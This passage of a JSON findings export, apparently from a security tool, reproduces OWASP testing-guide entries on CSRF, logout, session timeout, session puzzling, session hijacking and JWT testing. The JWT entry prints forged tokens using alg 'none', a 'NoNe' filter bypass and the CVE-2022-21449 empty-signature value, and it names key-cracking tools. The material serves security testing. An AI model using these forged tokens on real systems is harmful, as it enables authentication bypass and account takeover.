measures.\n\n## Tools\n\n* [ZAP](https://www.zaproxy.org/)\n* [CSRF Tester](https://wiki.owasp.org/index.php/Category:OWASP_CSRFTester_Project)\n* [Pinata-csrf-tool](https://code.google.com/archive/p/pinata-csrf-tool/)","Details":null,"Implication":null,"Recommendation":null,"References":"* [Peter W: \u201CCross-Site Request Forgeries\u201D](https://web.archive.org/web/20160303230910/http://www.tux.org/~peterw/csrf.txt)\n* [Thomas Schreiber: \u201CSession Riding\u201D](https://web.archive.org/web/20160304001446/http://www.securenet.de/papers/Session_Riding.pdf)\n* [Oldest known post](https://web.archive.org/web/20000622042229/http://www.zope.org/Members/jim/ZopeSecurity/ClientSideTrojan)\n* [Cross-site Request Forgery FAQ](https://www.cgisecurity.com/csrf-faq.html)\n* [A Most-Neglected Fact About Cross Site Request Forgery (CSRF)](http://yehg.net/lab/pr0js/view.php/A_Most-Neglected_Fact_About_CSRF.pdf)\n* [Multi-POST CSRF](https://www.lanmaster53.com/2013/07/17/multi-post-csrf/)\n* [SANS Pen Test Webcast: Complete Application pwnage via Multi POST XSRF](https://www.youtube.com/watch?v=EOs5PZiiwug)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"06-Session Management Testing","Description":"06-Session Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"23212627-d01d-4ff1-a6cc-378480f3cd7a","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-SESS-06 Testing for Logout Functionality","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nSession termination is an important part of the session lifecycle. Reducing to a minimum the lifetime of the session tokens decreases the likelihood of a successful session hijacking attack. This can be seen as a control against preventing other attacks like Cross Site Scripting and Cross Site Request Forgery. Such attacks have been known to rely on a user having an authenticated session present. Not having a secure session termination only increases the attack surface for any of these attacks.\nA secure session termination requires at least the following components:\n\n* Availability of user interface controls that allow the user to manually log out.\n* Session termination after a given amount of time without activity (session timeout).\n* Proper invalidation of server-side session state.\n\nThere are multiple issues which can prevent the effective termination of a session. For the ideal secure web application, a user should be able to terminate at any time through the user interface. Every page should contain a log out button on a place where it is directly visible. Unclear or ambiguous log out functions could cause the user not trusting such functionality.\nAnother common mistake in session termination is that the client-side session token is set to a new value while the server-side state remains active and can be reused by setting the session cookie back to the previous value. Sometimes only a confirmation message is shown to the user without performing any further action. This should be avoided.\nSome web application frameworks rely solely on the session cookie to identify the logged-on user. The user\u2019s ID is embedded in the (encrypted) cookie value. The application server does not do any tracking on the server-side of the session. When logging out, the session cookie is removed from the browser. However, since the application does not do any tracking, it does not know whether a session is logged out or not. So by reusing a session cookie it is possible to gain access to the authenticated session. A well-known example of this is the Forms Authentication functionality in ASP.NET.\nUsers of web browsers often don\u2019t mind that an application is still open and just close the browser or a tab. A web application should be aware of this behavior and terminate the session automatically on the server-side after a defined amount of time.\nThe usage of a single sign-on (SSO) system instead of an application-specific authentication scheme often causes the coexistence of multiple sessions which have to be terminated separately. For instance, the termination of the application-specific session does not terminate the session in the SSO system. Navigating back to the SSO portal offers the user the possibility to log back in to the application where the log out was performed just before. On the other side a log out function in a SSO system does not necessarily cause session termination in connected applications.","TestingInstructions":"## Test Objectives\n\n* Assess the logout UI.\n* Analyze the session timeout and if the session is properly killed after logout.\n\n## How to Test\n\n### Testing for Log Out User Interface\n\nVerify the appearance and visibility of the log out functionality in the user interface. For this purpose, view each page from the perspective of a user who has the intention to log out from the web application.\n\n\u003E There are some properties which indicate a good log out user interface:\n\u003E\n\u003E * A log out button is present on all pages of the web application.\n\u003E * The log out button should be identified quickly by a user who wants to log out from the web application.\n\u003E * After loading a page the log out button should be visible without scrolling.\n\u003E * Ideally the log out button is placed in an area of the page that is fixed in the view port of the browser and not affected by scrolling of the content.\n\n### Testing for Server-Side Session Termination\n\nFirst, store the values of cookies that are used to identify a session. Invoke the log out function and observe the behavior of the application, especially regarding session cookies. Try to navigate to a page that is only visible in an authenticated session, e.g. by usage of the back button of the browser. If a cached version of the page is displayed, use the reload button to refresh the page from the server. If the log out function causes session cookies to be set to a new value, restore the old value of the session cookies and reload a page from the authenticated area of the application. If these test don\u2019t show any vulnerabilities on a particular page, try at least some further pages of the application that are considered as security-critical, to ensure that session termination is recognized properly by these areas of the application.\n\n\u003E No data that should be visible only by authenticated users should be visible on the examined pages while performing the tests. Ideally the application redirects to a public area or a log in form while accessing authenticated areas after termination of the session. It should be not necessary for the security of the application, but setting session cookies to new values after log out is generally considered as good practice.\n\n### Testing for Session Timeout\n\nTry to determine a session timeout by performing requests to a page in the authenticated area of the web application with increasing delays. If the log out behavior appears, the used delay matches approximately the session timeout value.\n\n\u003E The same results as for server-side session termination testing described before are excepted by a log out caused by an inactivity timeout.\n\u003E The proper value for the session timeout depends on the purpose of the application and should be a balance of security and usability. In a banking applications it makes no sense to keep an inactive session more than 15 minutes. On the other side a short timeout in a wiki or forum could annoy users which are typing lengthy articles with unnecessary log in requests. There timeouts of an hour and more can be acceptable.\n\n### Testing for Session Termination in Single Sign-On Environments (Single Sign-Off)\n\nPerform a log out in the tested application. Verify if there is a central portal or application directory which allows the user to log back in to the application without authentication. Test if the application requests the user to authenticate, if the URL of an entry point to the application is requested. While logged in in the tested application, perform a log out in the SSO system. Then try to access an authenticated area of the tested application.\n\n\u003E It is expected that the invocation of a log out function in a web application connected to a SSO system or in the SSO system itself causes global termination of all sessions. An authentication of the user should be required to gain access to the application after log out in the SSO system and connected application.\n\n## Tools\n\n* [Burp Suite - Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater)","Details":null,"Implication":null,"Recommendation":null,"References":"* [Cookie replay attacks in ASP.NET when using forms authentication](https://www.vanstechelman.eu/content/cookie-replay-attacks-in-aspnet-when-using-forms-authentication)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"06-Session Management Testing","Description":"06-Session Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"23212627-d01d-4ff1-a6cc-378480f3cd7a","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-SESS-07 Testing Session Timeout","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nIn this phase testers check that the application automatically logs out a user when that user has been idle for a certain amount of time, ensuring that it is not possible to \u201Creuse\u201D the same session and that no sensitive data remains stored in the browser cache.\nAll applications should implement an idle or inactivity timeout for sessions. This timeout defines the amount of time a session will remain active in case there is no activity by the user, closing and invalidating the session upon the defined idle period since the last HTTP request received by the web application for a given session ID. The most appropriate timeout should be a balance between security (shorter timeout) and usability (longer timeout) and heavily depends on the sensitivity level of the data handled by the application. For example, a 60 minute log out time for a public forum can be acceptable, but such a long time would be too much in a home banking application (where a maximum timeout of 15 minutes is recommended). In any case, any application that does not enforce a timeout-based log out should be considered not secure, unless such behavior is required by a specific functional requirement.\nThe idle timeout limits the chances that an attacker has to guess and use a valid session ID from another user, and under certain circumstances could protect public computers from session reuse. However, if the attacker is able to hijack a given session, the idle timeout does not limit the attacker\u2019s actions, as he can generate activity on the session periodically to keep the session active for longer periods of time.\nSession timeout management and expiration must be enforced server-side. If some data under the control of the client is used to enforce the session timeout, for example using cookie values or other client parameters to track time references (e.g. number of minutes since log in time), an attacker could manipulate these to extend the session duration. So the application has to track the inactivity time server-side and, after the timeout is expired, automatically invalidate the current user\u2019s session and delete every data stored on the client.\nBoth actions must be implemented carefully, in order to avoid introducing weaknesses that could be exploited by an attacker to gain unauthorized access if the user forgot to log out from the application. More specifically, as for the log out function, it is important to ensure that all session tokens (e.g. cookies) are properly destroyed or made unusable, and that proper controls are enforced server-side to prevent the reuse of session tokens. If such actions are not properly carried out, an attacker could replay these session tokens in order to \u201Cresurrect\u201D the session of a legitimate user and impersonate him/her (this attack is usually known as \u2018cookie replay\u2019). Of course, a mitigating factor is that the attacker needs to be able to access those tokens (which are stored on the victim\u2019s PC), but, in a variety of cases, this may not be impossible or particularly difficult.\nThe most common scenario for this kind of attack is a public computer that is used to access some private information (e.g., web mail, online bank account). If the user moves away from the computer without explicitly logging out and the session timeout is not implemented on the application, then an attacker could access to the same account by simply pressing the \u201Cback\u201D button of the browser.","TestingInstructions":"## Test Objectives\n\n* Validate that a hard session timeout exists.\n\n## How to Test\n\n### Black-Box Testing\n\nThe same approach seen in the [Testing for logout functionality](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality) section can be applied when measuring the timeout log out. The testing methodology is very similar. First, testers have to check whether a timeout exists, for instance, by logging in and waiting for the timeout log out to be triggered. As in the log out function, after the timeout has passed, all session tokens should be destroyed or be unusable.\nThen, if the timeout is configured, testers need to understand whether the timeout is enforced by the client or by the server (or both). If the session cookie is non-persistent (or, more in general, the session cookie does not store any data about the time), testers can assume that the timeout is enforced by the server. If the session cookie contains some time related data (e.g., log in time, or last access time, or expiration date for a persistent cookie), then it\u2019s possible that the client is involved in the timeout enforcing. In this case, testers could try to modify the cookie (if it\u2019s not cryptographically protected) and see what happens to the session. For instance, testers can set the cookie expiration date far in the future and see whether the session can be prolonged.\nAs a general rule, everything should be checked server-side and it should not be possible, by re-setting the session cookies to previous values, to access the application again.\n\n### Gray-Box Testing\n\nThe tester needs to check that:\n\n* The log out function effectively destroys all session token, or at least renders them unusable,\n* The server performs proper checks on the session state, disallowing an attacker to replay previously destroyed session identifiers\n* A timeout is enforced and it is properly enforced by the server. If the server uses an expiration time that is read from a session token that is sent by the client (but this is not advisable), then the token must be cryptographically protected from tampering.\n\nNote that the most important thing is for the application to invalidate the session on the server-side. Generally this means that the code must invoke the appropriate methods, e.g. \u0060HttpSession.invalidate()\u0060 in Java and \u0060Session.abandon()\u0060 in .NET. Clearing the cookies from the browser is advisable, but is not strictly necessary, since if the session is properly invalidated on the server, having the cookie in the browser will not help an attacker.","Details":null,"Implication":null,"Recommendation":null,"References":"* [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"06-Session Management Testing","Description":"06-Session Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"23212627-d01d-4ff1-a6cc-378480f3cd7a","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-SESS-08 Testing for Session Puzzling","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nSession Variable Overloading (also known as Session Puzzling) is an application level vulnerability which can enable an attacker to perform a variety of malicious actions, including but not limited to:\n\n* Bypass efficient authentication enforcement mechanisms, and impersonate legitimate users.\n* Elevate the privileges of a malicious user account, in an environment that would otherwise be considered foolproof.\n* Skip over qualifying phases in multi-phase processes, even if the process includes all the commonly recommended code level restrictions.\n* Manipulate server-side values in indirect methods that cannot be predicted or detected.\n* Execute traditional attacks in locations that were previously unreachable, or even considered secure.\n\nThis vulnerability occurs when an application uses the same session variable for more than one purpose. An attacker can potentially access pages in an order unanticipated by the developers so that the session variable is set in one context and then used in another.\nFor example, an attacker could use session variable overloading to bypass authentication enforcement mechanisms of applications that enforce authentication by validating the existence of session variables that contain identity\u2013related values, which are usually stored in the session after a successful authentication process. This means an attacker first accesses a location in the application that sets session context and then accesses privileged locations that examine this context.\nFor example - an authentication bypass attack vector could be executed by accessing a publicly accessible entry point (e.g. a password recovery page) that populates the session with an identical session variable, based on fixed values or on user originating input.","TestingInstructions":"## Test Objectives\n\n* Identify all session variables.\n* Break the logical flow of session generation.\n\n## How to Test\n\n### Black-Box Testing\n\nThis vulnerability can be detected and exploited by enumerating all of the session variables used by the application and in which context they are valid. In particular this is possible by accessing a sequence of entry points and then examining exit points. In case of black-box testing this procedure is difficult and requires some luck since every different sequence could lead to a different result.\n\n#### Examples\n\nA very simple example could be the password reset functionality that, in the entry point, could request the user to provide some identifying information such as the username or the email address. This page might then populate the session with these identifying values, which are received directly from the client-side, or obtained from queries or calculations based on the received input. At this point there may be some pages in the application that show private data based on this session object. In this manner the attacker could bypass the authentication process.\n\n### Gray-Box Testing\n\nThe most effective way to detect these vulnerabilities is via a source code review.\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":"## Remediation\n\nSession variables should only be used for a single consistent purpose","References":"* [Session Puzzles](https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/puzzlemall/Session%20Puzzles%20-%20Indirect%20Application%20Attack%20Vectors%20-%20May%202011%20-%20Whitepaper.pdf)\n* [Session Puzzling and Session Race Conditions](https://sectooladdict.blogspot.com/2011/09/session-puzzling-and-session-race.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"06-Session Management Testing","Description":"06-Session Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"23212627-d01d-4ff1-a6cc-378480f3cd7a","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-SESS-09 Testing for Session Hijacking","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nAn attacker who gets access to user session cookies can impersonate them by presenting such cookies. This attack is known as session hijacking. When considering network attackers, i.e., attackers who control the network used by the victim, session cookies can be unduly exposed to the attacker over HTTP. To prevent this, session cookies should be marked with the \u0060Secure\u0060 attribute so that they are only communicated over HTTPS.\nNote that the \u0060Secure\u0060 attribute should also be used when the web application is entirely deployed over HTTPS, otherwise the following cookie theft attack is possible. Assume that \u0060example.com\u0060 is entirely deployed over HTTPS, but does not mark its session cookies as \u0060Secure\u0060. The following attack steps are possible:\n\n1. The victim sends a request to \u0060http://another-site.com\u0060.\n2. The attacker corrupts the corresponding response so that it triggers a request to \u0060http://example.com\u0060.\n3. The browser now tries to access \u0060http://example.com\u0060.\n4. Though the request fails, the session cookies are leaked in the clear over HTTP.\n\nAlternatively, session hijacking can be prevented by banning use of HTTP using [HSTS](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security). Note that there is a subtlety here related to cookie scoping. In particular, full HSTS adoption is required when session cookies are issued with the \u0060Domain\u0060 attribute set.\nFull HSTS adoption is described in a paper called *Testing for Integrity Flaws in Web Sessions* by Stefano Calzavara, Alvise Rabitti, Alessio Ragazzo, and Michele Bugliesi. Full HSTS adoption occurs when a host activates HSTS for itself and all its sub-domains. Partial HSTS adoption is when a host activates HSTS just for itself.\nWith the \u0060Domain\u0060 attribute set, session cookies can be shared across sub-domains. Use of HTTP with sub-domains should be avoided to prevent the disclosure of unencrypted cookies sent over HTTP. To exemplify this security flaw, assume that the site \u0060example.com\u0060 activates HSTS without the \u0060includeSubDomains\u0060 option. The site issues session cookies with the \u0060Domain\u0060 attribute set to \u0060example.com\u0060. The following attack is possible:\n\n1. The victim sends a request to \u0060http://another-site.com\u0060.\n2. The attacker corrupts the corresponding response so that it triggers a request to \u0060http://fake.example.com\u0060.\n3. The browser now tries to access \u0060http://fake.example.com\u0060, which is permitted by the HSTS configuration.\n4. Since the request is sent to a sub-domain of \u0060example.com\u0060 with the \u0060Domain\u0060 attribute set, it includes the session cookies, which are leaked in the clear over HTTP.\n\nFull HSTS should be activated on the apex domain to prevent this attack.","TestingInstructions":"## Test Objectives\n\n* Identify vulnerable session cookies.\n* Hijack vulnerable cookies and assess the risk level.\n\n## How to Test\n\nThe testing strategy is targeted at network attackers, hence it only needs to be applied to sites without full HSTS adoption (sites with full HSTS adoption are secure, since their cookies are not communicated over HTTP). We assume to have two testing accounts on the site under test, one to act as the victim and one to act as the attacker. We simulate a scenario where the attacker steals all the cookies which are not protected against disclosure over HTTP, and presents them to the site to access the victim\u2019s account. If these cookies are enough to act on the victim\u2019s behalf, session hijacking is possible.\nHere are the steps for executing this test:\n\n1. Login to the site as the victim and reach any page offering a secure function requiring authentication.\n2. Delete from the cookie jar all the cookies which satisfy any of the following conditions.\n    * in case there is no HSTS adoption: the \u0060Secure\u0060 attribute is set.\n    * in case there is partial HSTS adoption: the \u0060Secure\u0060 attribute is set or the \u0060Domain\u0060 attribute is not set.\n3. Save a snapshot of the cookie jar.\n4. Trigger the secure function identified at step 1.\n5. Observe whether the operation at step 4 has been performed successfully. If so, the attack was successful.\n6. Clear the cookie jar, login as the attacker and reach the page at step 1.\n7. Write in the cookie jar, one by one, the cookies saved at step 3.\n8. Trigger again the secure function identified at step 1.\n9. Clear the cookie jar and login again as the victim.\n10. Observe whether the operation at step 8 has been performed successfully in the victim\u2019s account. If so, the attack was successful; otherwise, the site is secure against session hijacking.\n\nWe recommend using two different machines or browsers for the victim and the attacker. This allows you to decrease the number of false positives if the web application does fingerprinting to verify access enabled from a given cookie. A shorter but less precise variant of the testing strategy only requires one testing account. It follows the same pattern, but it halts at step 5 (note that this makes step 3 useless).\n\n## Tools\n\n* [ZAP](https://www.zaproxy.org/)\n* [JHijack - a numeric session hijacking tool](https://sourceforge.net/projects/jhijack/)","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"06-Session Management Testing","Description":"06-Session Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"23212627-d01d-4ff1-a6cc-378480f3cd7a","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-SESS-10 Testing JSON Web Tokens","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nJSON Web Tokens (JWTs) are cryptographically signed JSON tokens, intended to share claims between systems. They are frequently used as authentication or session tokens, particularly on REST APIs.\nJWTs are a common source of vulnerabilities, both in how they are in implemented in applications, and in the underlying libraries. As they are used for authentication, a vulnerability can easily result in a complete compromise of the application.","TestingInstructions":"## Test Objectives\n\n* Determine whether the JWTs expose sensitive information.\n* Determine whether the JWTs can be tampered with or modified.\n\n## How to Test\n\n### Overview\n\nJWTs are are made up of three components:\n\n* The header\n* The payload (or body)\n* The signature\n\nEach component is base64 encoded, and they are separated by periods (\u0060.\u0060). Note that the base64 encoding used in a JWT strips out the equals signs (\u0060=\u0060), so you may need to add these back in to decode the sections.\n\n### Analyse the Contents\n\n#### Header\n\nThe header defines the type of token (typically \u0060JWT\u0060), and the algorithm used for the signature. An example decoded header is shown below:\n\n\u0060\u0060\u0060\n{\n  \u0022alg\u0022: \u0022HS256\u0022,\n  \u0022typ\u0022: \u0022JWT\u0022\n}\n\u0060\u0060\u0060\n\nThere are three main types of algorithms that are used to calculate the signatures:\n\n| Algorithm | Description |\n| --------- | ----------- |\n| HSxxx | HMAC using a secret key and SHA-xxx. |\n| RSxxx and PSxxx | Public key signature using RSA. |\n| ESxxx | Public key signature using ECDSA. |\n\nThere are also a wide range of [other algorithms](https://www.iana.org/assignments/jose/jose.xhtml#web-signature-encryption-algorithms) which may be used for encrypted tokens (JWEs), although these are less common.\n\n#### Payload\n\nThe payload of the JWT contains the actual data. An example payload is shown below:\n\n\u0060\u0060\u0060\n{\n  \u0022username\u0022: \u0022administrator\u0022,\n  \u0022is_admin\u0022: true,\n  \u0022iat\u0022: 1516239022,\n  \u0022exp\u0022: 1516242622\n}\n\u0060\u0060\u0060\n\nThe payload is it not usually encrypted, so review it to determine whether there is any sensitive of potentially inappropriate data included within it.\nThis JWT includes the username and administrative status of the user, as well as two standard claims (\u0060iat\u0060 and \u0060exp\u0060). These claims are defined in [RFC 5719](https://tools.ietf.org/html/rfc7519#section-4.1), a brief summary of them is given in the table below:\n\n| Claim | Full Name | Description |\n| ----- | --------- | ----------- |\n| \u0060iss\u0060 | Issuer | The identity of the party who issued the token. |\n| \u0060iat\u0060 | Issued At | The Unix timestamp of when the token was issued. |\n| \u0060nbf\u0060 | Not Before | The Unix timestamp of earliest date that the token can be used. |\n| \u0060exp\u0060 | Expires | The Unix timestamp of when the token expires. |\n\n#### Signature\n\nThe signature is calculated using the algorithm defined in the JWT header, and then base64 encoded and appended to the token. Modifying any part of the JWT should cause the signature to be invalid, and the token to be rejected by the server.\n\n### Review Usage\n\nAs well as being cryptographically secure itself, the JWT also needs to be stored and sent in a secure manner. This should include checks that:\n\n* It is always [sent over encrypted (HTTPS) connections](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels).\n* If it is stored in a cookie, then it should be [marked with appropriate attributes](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes).\n\nThe validity of the JWT should also be reviewed, based on the \u0060iat\u0060, \u0060nbf\u0060 and \u0060exp\u0060 claims, to determine that:\n\n* The JWT has a reasonable lifespan for the application.\n* Expired tokens are rejected by the application.\n\n### Signature Verification\n\nOne of the most serious vulnerabilities encountered with JWTs is when the application fails to validate that the signature is correct. This usually occurs when a developer uses a function such as the NodeJS \u0060jwt.decode()\u0060 function, which simply decodes the body of the JWT, rather than \u0060jwt.verify()\u0060, which verifies the signature before decoding the JWT.\nThis can be easily tested for by modifying the body of the JWT without changing anything in the header or signature, submitting it in a request to see if the application accepts it.\n\n#### The None Algorithm\n\nAs well as the public key and HMAC-based algorithms, the JWT specification also defines a signature algorithm called \u0060none\u0060. As the name suggests, this means that there is no signature for the JWT, allowing it to be modified.\nThis can be tested by modifying the signature algorithm (\u0060alg\u0060) in the JWT header to \u0060none\u0060, as shown in the example below:\n\n\u0060\u0060\u0060\n{\n        \u0022alg\u0022: \u0022none\u0022,\n        \u0022typ\u0022: \u0022JWT\u0022\n}\n\u0060\u0060\u0060\n\nThe header and payload are then re-encoded with base64, and the signature is removed (leaving the trailing period). Using the header above, and the payload listed in the [payload](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens#payload) section, this would give the following JWT:\n\n\u0060\u0060\u0060\neyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0K.eyJ1c2VybmFtZSI6ImFkbWluaW5pc3RyYXRvciIsImlzX2FkbWluIjp0cnVlLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6MTUxNjI0MjYyMn0.\n\u0060\u0060\u0060\n\nSome implementations try and avoid this by explicitly blocking the use of the \u0060none\u0060 algorithm. If this is done in a case-insensitive way, it may be possible to bypass by specifying an algorithm such as \u0060NoNe\u0060.\n\n#### ECDSA \u201CPsychic Signatures\u201D\n\nA vulnerability was identified in Java version 15 to 18 where they did not correctly validate ECDSA signatures in some circumstances ([CVE-2022-21449](https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/), known as \u201Cpsychic signatures\u201D). If one of these vulnerable versions is used to parse a JWT using the \u0060ES256\u0060 algorithm, this can be used to completely bypass the signature verification by tampering the body and then replacing the signature with the following value:\n\n\u0060\u0060\u0060\nMAYCAQACAQA\n\u0060\u0060\u0060\n\nResulting in a JWT which looks something like this:\n\n\u0060\u0060\u0060\neyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.MAYCAQACAQA\n\u0060\u0060\u0060\n\n### Weak HMAC Keys\n\nIf the JWT is signed using a HMAC-based algorithm (such as HS256), the security of the signature is entirely reliant on the strength of the secret key used in the HMAC.\nIf the application is using off-the-shelf or open source software, the first step should be go investigate the code, and see whether there is default HMAC signing key that is used.\nIf there isn\u2019t a default, then it may be possible to crack guess or brute-force they key. The simplest way to do this is to use the [crackjwt.py](https://github.com/Sjord/jwtcrack) script, which simply requires the JWT and a dictionary file.\nA more powerful option is to convert the JWT into a format that can be used by [John the Ripper](https://github.com/openwall/john) using the [jwt2john.py](https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py) script. John can then be used to carry out much more advanced attacks against the key.\nIf the JWT is large, it may exceed the maximum size supported by John. This can be worked around by increasing the value of the \u0060SALT_LIMBS\u0060 variable in \u0060/src/hmacSHA256_fmt_plug.c\u0060 (or the equivalent file for other HMAC formats) and recompiling John, as discussed in the following [GitHub issue](https://github.com/openwall/john/issues/1904).\nIf this key can be obtained, then it is possible to create and sign arbitrary JWTs, which usually results in a complete compromise of the application.\n\n### HMAC vs Public Key Confusion\n\nIf the application uses JWTs with public key based signatures, but does not check that the algorithm is correct, this can potentially exploit this in a signature type confusion attack. In order for this to be successful, the following conditions need to be met:\n\n1. The application must expect the JWT to be signed with a public key based algorithm (i.e, \u0060RSxxx\u0060 or 